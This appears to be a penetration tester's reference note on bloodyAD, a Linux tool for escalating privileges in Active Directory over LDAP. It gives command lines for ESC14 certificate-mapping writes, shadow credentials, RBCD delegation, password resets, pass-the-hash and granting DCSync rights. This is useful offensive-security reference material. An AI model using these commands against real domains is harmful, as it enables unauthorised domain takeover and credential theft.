# bloodyAD

**Tags:** #AD #LDAP #ActiveDirectory #privesc #enumeration

An Active Directory privilege-escalation framework that talks LDAP/LDAPS/SAMR directly, with no reliance on `.NET` or a Windows host. Where most Linux AD tooling only *reads* the directory, bloodyAD's value is that it **writes** it — `set object` will put an arbitrary value into an arbitrary attribute, which is exactly what several attack paths need and what the specialised tools refuse to do.

That gap matters for **ESC14**: [[Tools/AD/Certipy|Certipy]]'s `account` subcommand can only write `-dns`, `-upn`, `-sam`, `-spns`, `-pass` and `-group`, so it cannot touch `altSecurityIdentities` at all. bloodyAD can. It also covers the usual RBCD / shadow-credential / DACL writes, and supports Kerberos, NTLM hashes and certificate auth.

**Source:** https://github.com/CravateRouge/bloodyAD
**Install:** `pipx install bloodyAD` (or `apt install bloodyad` on recent Kali)

```bash
# Generic attribute write — the ESC14 primitive
bloodyAD --host <dc_ip> -d <domain> -u <user> -p '<pass>' \
  set object <target_user> altSecurityIdentities \
  -v 'X509:<I>DC=com,DC=domain,CN=CORP-CA<SR>1200000012ab'

# Read it back to confirm
bloodyAD --host <dc_ip> -d <domain> -u <user> -p '<pass>' \
  get object <target_user> --attr altSecurityIdentities

# Other writes that show up alongside AD CS work
bloodyAD --host <dc_ip> -d <domain> -u <user> -p '<pass>' add shadowCredentials <target>
bloodyAD --host <dc_ip> -d <domain> -u <user> -p '<pass>' add rbcd <target> <controlled_machine$>
bloodyAD --host <dc_ip> -d <domain> -u <user> -p '<pass>' set password <target> 'NewPass123!'

# Auth variants
bloodyAD --host <dc_ip> -d <domain> -u <user> -p ':<NTLM_hash>' get children
bloodyAD --host <dc_ip> -d <domain> -k get children                    # Kerberos, from KRB5CCNAME
```

**Command surface (verb → what's worth knowing).** Run as `bloodyAD ... <verb> <function> [args]`:

| Verb | Functions you'll actually use |
|---|---|
| `get` | `children`, `object --attr`, `writable` (what *you* can edit — the first thing to run), `dnsDump`, `search`, `membership`, `trusts` |
| `set` | `object` (arbitrary attribute write — the ESC14 primitive), `password`, `owner` (take ownership), `restore` (un-delete a tombstoned object) |
| `add` | `shadowCredentials`, `rbcd`, `genericAll`, `groupMember`, `dcsync` (grant yourself replication), `uac` (flip account-control bits, e.g. DONT_REQ_PREAUTH for targeted AS-REP), `computer`, `user`, `dnsRecord`, `gmsaGroup`, `badSuccessor` |
| `remove` | mirrors `add` — undo each write for cleanup |

> [!tip] **`get writable` is the killer feature** — it enumerates every object your principal can modify and *which* right you hold, so you find the escalation edge without loading BloodHound. Scope it, e.g. `get writable --otype GPO` or `--right WRITE`.

> [!warning] `set object` overwrites the attribute's value. On a multi-valued attribute such as `altSecurityIdentities`, read the existing values first and re-supply them alongside yours, or you will silently break a legitimate certificate mapping that someone depends on.

> [!note] **See also**
> Services this tool is used against in this vault: [[Services/Active Directory/ADCS|ADCS]] — writing `altSecurityIdentities` for ESC14, the one step Certipy cannot perform; [[Services/Active Directory/Kerberos|Kerberos]] — the `sAMAccountName` rename primitive in the manual noPac (CVE-2021-42278/42287) chain, plus RBCD writes; [[Services/Active Directory/ACL Abuse|ACL Abuse]] — `get writable` plus every write primitive (genericAll/owner/dcsync/shadowCredentials/groupMember/password); [[Services/Active Directory/Domain Trusts|Domain Trusts]] — reading trust objects; [[Services/Active Directory/GPO Abuse|GPO Abuse]] — `get writable --otype GPO`.
> Also [[Services/Network Management/LDAP|LDAP]] — bloodyAD's read/write primitives (RBCD, shadow creds, DACL, `add computer`) are the write side of the LDAP attack surface.
> Related tooling: [[Tools/AD/Certipy|Certipy]] (the AD CS side of the same attack), [[Tools/AD/PowerView|PowerView]] (`Set-DomainObject`, the Windows-side equivalent), [[Tools/AD/ldapsearch|ldapsearch]] (read-only triage of what's already set).

---

*Created: 2026-09-22*
*Updated: 2026-09-28*
*Model: claude-opus-4-8*
